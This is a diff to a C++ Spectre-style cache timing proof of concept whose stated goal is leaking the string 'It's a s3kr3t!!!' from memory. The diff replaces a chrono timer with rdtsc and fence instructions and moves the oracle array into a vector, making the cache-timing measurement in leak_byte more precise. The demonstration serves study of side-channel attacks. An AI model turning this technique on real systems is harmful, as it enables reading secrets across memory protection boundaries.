@@ -26,7 +26,6 @@
 
 #include <algorithm>
 #include <array>
-#include <chrono>
 #include <cstring>
 #include <iostream>
 #include <memory>
@@ -34,6 +33,7 @@
 #include <string>
 #include <string_view>
 #include <tuple>
+#include <vector>
 
 // Objective: given some control over accesses to the *non-secret* string
 // "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
@@ -52,29 +52,6 @@ const std::string_view private_data = "It's a s3kr3t!!!";
 // Forces a memory read of the byte at address p. This will result in the byte
 // being loaded into cache.
 static void force_read(void *p) { (void)*(volatile char *)p; }
-
-static int64_t get_timestamp() {
-  // TODO this time measurement technique does not work on Google Cloud.
-  // I'm getting basically just garbage (in Visual Studio on Windows Server):
-  // read durations: 600 300 200 200 100 100 500 200 200 200 900 300 200 300 200
-  // 200 200 400 300 300 500 200 200 300 300 300 300 200 300 300 200 300 200 400
-  // 200 200 600 300 300 200 200 300 200 200 200 200 200 200 200 400 200 600 200
-  // 200 200 100 100 400 200 200 200 200 300 300 200 400 200 300 600 300 200 300
-  // 300 800 300 200 300 200 200 300 200 400 300 200 200 300 300 200 300 400 200
-  // 200 200 200 300 200 200 400 200 400 300 200 600 200 300 400 200 300 200 300
-  // 300 200 200 700 200 300 300 300 300 200 200 300 200 200 400 200 200 200 200
-  // 400 200 200 200 200 400 100 200 400 300 200 200 400 200 200 200 400 200 300
-  // 200 300 200 300 200 300 200 200 400 200 200 300 200 300 300 400 200 300 600
-  // 200 300 200 300 200 200 100 200 200 200 300 300 300 400 200 200 300 300 700
-  // 300 200 200 200 200 200 200 700 400 200 300 200 300 200 200 400 500 200 300
-  // 300 300 300 200 400 200 200 300 300 300 300 200 300 200 300 200 200 200 1300
-  // 300 400 300 200 300 300 300 200 300 300 300 200 300 300 300 300 200 300 300
-  // 200 100 200 200 200 400 800 200 300 200 200 300 300
-  // safe offset (verified hit): 300
-  return std::chrono::duration_cast<std::chrono::nanoseconds>(
-             std::chrono::high_resolution_clock::now().time_since_epoch())
-      .count();
-}
 
 // Returns the indices of the biggest and second-biggest values in the range.
 template <typename RangeT>
@@ -134,7 +111,7 @@ static char leak_byte(std::string_view text, int offset) {
     // between accessed and unaccessed pages (modulo e.g. TLB lookups).
     std::array<unsigned char, 4096> padding_ = {};
   };
-  std::array<BigByte, 257> oracle_array;
+  std::vector<BigByte> oracle_array(257);
   // The first value is adjacent to other elements on the stack, so
   // we only use the other elements, which are guaranteed to be on different
   // cache lines, and even different pages, than any other value.
@@ -210,10 +187,15 @@ static char leak_byte(std::string_view text, int offset) {
       // On the CPUs this has been tested on, placing values 4096 bytes apart
       // is sufficient to defeat prefetching.
       void *timing_entry = &isolated_oracle[i];
-      int64_t start = get_timestamp();
+      _mm_mfence();
+      _mm_lfence();
+      int64_t start = __rdtsc();
+      _mm_lfence();
       force_read(timing_entry);
-      latencies[i] = get_timestamp() - start;
+      _mm_lfence();
+      latencies[i] = __rdtsc() - start;
     }
+    _mm_lfence();
     int64_t avg_latency =
         std::accumulate(latencies.begin(), latencies.end(), 0) / 256;
 
